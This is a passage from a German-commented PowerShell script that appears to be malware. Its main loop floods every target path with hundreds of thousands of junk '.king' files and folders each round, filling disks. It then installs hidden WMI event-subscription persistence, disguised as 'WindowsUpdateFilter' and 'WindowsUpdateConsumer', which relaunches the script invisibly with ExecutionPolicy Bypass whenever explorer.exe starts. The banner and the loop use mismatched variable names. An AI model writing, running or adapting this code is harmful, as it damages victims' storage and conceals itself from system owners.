# ===== HAUPTSCHLEIFE - FIXED: ALLE ZIELE JEDE RUNDE =====
Write-Host "[INFO] STARTE MIT $($alleZiele.Count) ZIELEN - $global:maxRunden RUNDEN" -ForegroundColor Green

while ($global:currentRound -lt $global:maxRounds) {
    $global:currentRound++
    Write-Host "[RUNDE $global:currentRound] Spamme ALLE $($alleZiele.Count) Ziele..." -ForegroundColor Yellow
    
    # JEDE RUNDE: ALLE Ziele durchgehen!
    foreach ($ziel in $alleZiele) {
        if (Test-Path $ziel) {
            # Hauptordner für DIESE Runde in DIESEM Ziel
            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
            
            # 500 DATEIEN pro Ziel pro Runde
            for ($i = 1; $i -le 500; $i++) {
                # Direkt im Ziel
                $f1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f1 -Encoding UTF8 -Force
                
                # Im Hauptordner
                $f2 = Join-Path $mainFolder "file_$i.king"
                "$env:COMPUTERNAME - RUNDE $global:currentRound - $i" | Out-File $f2 -Encoding UTF8 -Force
            }
            
            # 500 UNTERORDNER pro Ziel pro Runde
            for ($u = 1; $u -le 500; $u++) {
                $subFolder = Join-Path $mainFolder "SUB_$u"
                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                
                # 500 DATEIEN pro Unterordner
                for ($s = 1; $s -le 500; $s++) {
                    $sf = Join-Path $subFolder "subfile_$s.king"
                    "SUB $u - RUNDE $global:currentRound - DATEI $s" | Out-File $sf -Encoding UTF8 -Force
                }
            }
        }
    }
    
    # Zeige Fortschritt
    Write-Host "[RUNDE $global:currentRound] Fertig! Nächste Runde..." -ForegroundColor Green
    Start-Sleep -Milliseconds 500  # Kurze Pause
}

# ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
$wmiJob = Start-Job -ScriptBlock {
    try {
        # Event Filter - startet bei Systemstart
        $filterArgs = @{
            Name = 'WindowsUpdateFilter'
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
        }
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
        
        # Event Consumer - führt Skript aus
        $consumerArgs = @{
            Name = 'WindowsUpdateConsumer'
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
        }
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
        
        # Filter mit Consumer verbinden
        $bindingArgs = @{Filter=$filter; Consumer=$consumer}
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
    } catch {}
}

